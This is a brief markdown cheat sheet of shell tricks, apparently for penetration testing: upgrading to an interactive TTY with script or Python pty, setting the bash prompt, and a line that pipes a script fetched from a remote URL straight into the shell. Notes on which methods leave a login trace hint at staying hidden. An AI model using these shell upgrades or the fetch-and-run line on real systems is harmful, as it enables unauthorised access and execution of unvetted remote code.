
- **Spawn TTY shell**: `/usr/bin/script -qc /bin/bash /dev/null`
> Note: This method shows yourself logged in.

<br />

- **Spawn Python TTY Shell**: `python -c 'import pty;pty.spawn("/bin/bash")'`
> Note: This method doesn't show yourself logged in.

<br />

- **Add PWD in bash**: `PS1='\u@\h:\w\$ '`

<br />

- **Run script from URL**: `source <(curl -s http://mywebsite.com/myscript.sh)`
